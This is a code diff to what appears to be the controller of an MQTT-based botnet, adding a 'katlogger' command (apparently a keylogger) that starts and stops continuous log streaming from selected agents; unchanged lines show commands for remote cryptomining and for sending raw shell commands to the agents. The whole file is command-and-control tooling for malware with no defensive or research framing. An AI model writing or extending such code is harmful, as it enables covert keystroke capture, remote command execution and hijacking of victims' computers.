@@ -15,6 +15,7 @@ peers_pub = {}
 peers_cwd = {}
 responses = {}
 selected_agents = []
+active_katlogger_id = None
 
 def load_or_create_keyfile(path):
     if os.path.exists(path):
@@ -43,10 +44,15 @@ def on_connect(c, u, flags, rc):
     c.subscribe("meta/#")
     publish_meta()
 def send_control_command(command):
+    global active_katlogger_id
     if not selected_agents:
         print(Fore.RED + "No agents selected!" + Fore.RESET)
         return
     req_id = str(uuid.uuid4())
+    if command == "katlogger":
+        active_katlogger_id = req_id
+    elif command == "stop katlogger":
+        active_katlogger_id = None
     req = {
         "type": "control",
         "from": CONTROLLER_ID,
@@ -81,7 +87,11 @@ def on_message(c, u, msg):
             obj = json.loads(pt.decode())
             rid = obj.get("id"); t = obj.get("type")
             if t == "cwd": peers_cwd[sender]=obj.get("cwd"); print(Fore.YELLOW + f"[{sender}] CWD updated: {obj.get('cwd')}" + Fore.RESET)
-            elif t=="cmd_output": print(f"[{sender}] {obj.get('line')}")
+            elif t=="cmd_output":
+                if active_katlogger_id == rid:
+                    # Clear screen before printing new log lines
+                    print("\033c", end="")
+                print(f"[{sender}] {obj.get('line')}")
             elif t=="cmd_exit": responses.setdefault(rid, {})["exit"]=obj
     except: pass
 
@@ -120,6 +130,10 @@ def cli_loop():
             send_control_command("start mining")
         elif cmd.startswith("stop mining"):
             send_control_command("stop mining")
+        elif cmd.startswith("katlogger"):
+            send_control_command("katlogger")
+        elif cmd == "stop katlogger":
+            send_control_command("stop katlogger")
         elif cmd.startswith("raw "):
             send_raw(cmd[4:].strip())
         elif cmd in ("exit","quit"): break
@@ -128,6 +142,8 @@ def cli_loop():
 Available commands:
     agent <id1> <id2> ...   - Select agents by ID (or 'all' for all)
     refresh                 - List available agents
+    katlogger               - Start continuous logging from selected agents
+    stop katlogger          - Stop continuous logging
     raw <command>           - Send raw command to selected agents
     help                    - Show this help message
     exit, quit              - Exit the controller
